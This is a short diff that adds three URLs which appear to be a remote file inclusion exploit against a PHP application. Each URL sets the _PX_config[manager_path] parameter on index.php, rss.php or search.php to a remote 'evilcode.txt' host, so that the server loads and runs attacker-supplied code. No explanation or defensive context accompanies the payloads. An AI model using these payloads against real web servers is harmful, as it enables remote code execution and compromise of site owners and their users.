@@ -1,0 +1,3 @@
+http://www.example.com/(path)/index.php?_PX_config[manager_path]=http://evilcode.txt?
+http://www.example.com/(path)/rss.php?_PX_config[manager_path]=http://evilcode.txt?
+http://www.example.com/(path)/search.php?_PX_config[manager_path]=http://evilcode.txt?
